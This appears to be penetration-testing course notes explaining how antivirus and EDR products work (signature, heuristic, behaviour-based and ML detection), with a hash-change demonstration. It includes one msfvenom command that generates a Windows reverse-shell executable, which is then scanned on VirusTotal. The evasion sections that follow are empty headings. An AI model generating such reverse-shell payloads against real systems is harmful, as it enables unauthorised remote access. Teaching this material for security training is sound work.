# AV Evasion Fundamentals

## AV Software Key Components and Operations

### Known vs. Unknown Threats

In its original design, an AV software bases its operation and decisions on signatures. The goal of a signature is to uniquely identify a specific piece of malware. Signatures can vary in terms of type and characteristics that can span from a very generic file hash summary to a more specific binary sequence match. An AV comprises different engines responsible for detecting and analyzing specific components of the running system.

A signature language is often defined for each AV engine and thus, a signature can represent different aspects of a piece of malware, depending on the AV engine. For example: two signatures can be developed to contrast the exact same type of malware: one to target the malware file on disk and another to detect its network communication. The semantics of the two signatures can vary drastically as they are intended for two different AV engines.

As signatures are written based on known threats, AV products could initially only detect and react based on malware that has already been vetted and documented. However, modern AV solutions, including Windows Defender, are shipped with a Machine Learning engine that is queried whenever an unknown file is discovered on a system. These ML engines can detect unknown threats. Since ML engines operate on the cloud, they require an active connection to the internet, which is often not an option on internal enterprise servers. Moreover, the many engines that constitute an AV should not borror too many computing resources from the rest of the system as it could impact the system's usability.

To overcome these AV limitations, Endpoint Detection and Response solutions have evolved during recent years. EDR software is responsible for generating security-event telemetry and forwarding it to a Security Information and Event Management system, which collects data from every company host. These events are then rendered by the SIEM so that the security analyst team can gain a full overview of any past or ongoing attack affecting the organization.

Even though some EDR solutions include AV components, AVs and EDRs are not mutually exclusive as they complement each other with enhanced visibility and detection. Ultimately, their deployment should be evaluated based on an organization's internal network design and current security posture.

### AV Engines and Components

At its core, a modern AV is fueled by signature updates fetched from the vendor's signature database that resides on the internet. Those signature definitions are stored in the local AV signature database, which in turn feeds the more specific engines.

A modern AV is typically designed around the following components:

- **File Engine**: is responsible for both scheduled and real-time file scans. When the engine performs a scheduled scan, it simply parses the entire file system and sends each file's metadata or data to the signature engine. On the contrary, real-time scans involve detecting and possibly reacting to any new file action, such as downloading new malware from a website. To detect such operations, the real-time scanners need to identify events at the kernel level via a specially crafted [mini-filter driver](https://learn.microsoft.com/en-us/windows-hardware/drivers/ifs/filter-manager-concepts). This is the reason why a modern AV needs to operate both in kernel and user land, in order to validate the entire OS scope.
- **Memory Engine**: inspects each process's memory space at runtime for well-known binary signatures or suspicious API calls that might result in memory injection attacks.
- **Network Engine**: inspects the incoming and outgoing network traffic on the local network interface. Once a signature is matched, a network engine might attempt to block the malware from communicating with its C2.
- **Disassembling/Emulator/Sandbox**: To further hinder detection, malware often employs encryption and decryption through custom routines to conceal its true nature. AVs counterattack this strategy by disassembling the malware packers or ciphers and loading the malware into a sandbox, or emulator.
	- **Disassembler Engine**: is responsible for translating machine code into assembly language, reconstructing the original program code section, and identifying any encoding/decoding routine.
	- **Sandbox**: is a special isolated environment in the AV software where malware can be safely loaded and executed without causing potential havoc to the system.
	- **Emulator**: Once the malware is unpacked/decoded and running in the emulator, it can be thoroughly analyzed against any known signature.

### Detection Methods

**Signature-based** AV detection is mostly considered a restricted list technology. In other words, the filesystem is scanned for known malware signatures and if any are detected, the offending files are quarantined.

A signature can be just as simple as the hash of the file itself or a set of multiple patterns, such as specific binary values and strings that should belong only to that specific malware.

Relying on just the file hash as the only detection mechanism is a weak strategy because changing a single bit from the file would result in a completely different hash.

As an example, you created a text file that contains the string "offsec". Dump its binary representation via the `xxd` tool by passing the `-b` argument before the file name.

```bash
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01100011  offsec
00000006: 00001010 
```

The output shows the binary offset on the leftmost column, the actual binary representation in the middle column, and the ASCII translation on the rightmost one.

Now, assuming this is real malware, you want to calculate the hash of the file, and you can do so through the `sha256sum` utility.

```bash
kali@kali:~$ sha256sum malware.txt
c361ec96c8f2ffd45e8a990c41cfba4e8a53a09e97c40598a0ba2383ff63510e  malware.txt
```

Now replace the last letter of the "offsec" string with a capital "C" and dump its binary value via `xxd` once more.

```bash
kali@kali:~$ xxd -b malware.txt
00000000: 01101111 01100110 01100110 01110011 01100101 01000011  offseC
00000006: 00001010
```

Since every hashing algorithm is supposed to produce a totally different hash even if only one bit has changed, calculate the SHA256 hash on the modified string.

```bash
kali@kali:~$ sha256sum malware.txt
15d0fa07f0db56f27bcc8a784c1f76a8bf1074b3ae697cf12acf73742a0cc37c  malware.txt
```

**Heuristic-Based Detection** is a detection method that relies on various rules and algorithms to determine if an action is considered malicious. This is often achieved by stepping through the instruction set of a binary file or by attempting to disassemble the machine code and ultimately decompile and analyze the source code to obtain a more comprehensive map of the program. The idea is to search for various patterns and program calls that are considered malicious.

Alternatively, **Behavior-Based Detection** dynamically analyzes the behavior of a binary file. This is often achieved by executing the file in question in an emulated environment, such as a small virtual machine, or sandbox, and searching for behaviors or actions that are considered malicious.

Lastly, **ML Detection** aims to up the game by introducing ML algorithms to detect unknown threats by collecting and analyzing additional metadata. For instance, Microsoft Windows Defender has two ML components: the client ML engine, which is responsible for creating ML models and heuristics, and the cloud ML engine, which is capable of analyzing the submitted sample against a metadata-based model comprised of all the submitted samples. Whenever the client ML engine is unable to determine whether a program is benign or not, it will query the cloud ML counterpart for a final response.

Since these techniques do not require malware signatures, they can be used to identify unknown malware, or variations of known malware, more effectively. Given that AV manufacturers use different implementations when it comes to heuristics, behavior, and machine learning detection, each AV product will differ in terms of what code is considered malicious.

AV developers use a combination of these detection methods to achieve higher detection rates.

To demonstrate the effectiveness of various AV products, you will start by scanning a popular Metasploit payload.

Generate the test binary payload by running the `msfvenom` command followed by the `-p` argument specifying the payload. You'll then pass the reverse shell local host and local port arguments along with the EXE file format and redirect the output to a file named binary.exe.

```bash
kali@kali:~$ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.50.1 LPORT=443 -f exe > binary.exe
...
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 324 bytes
Final size of exe file: 73802 bytes
```

Next, run a virus scan on this executable. You can upload the file to VirusTotal.

After the upload and analysis of the file is done, you notice that many AV products determined your file is malicious based on the different detection mechanisms.

## Bypassing AV Detections

### On-Disk Evasion

### In-Memory Evasion

## AV Evasion in Practice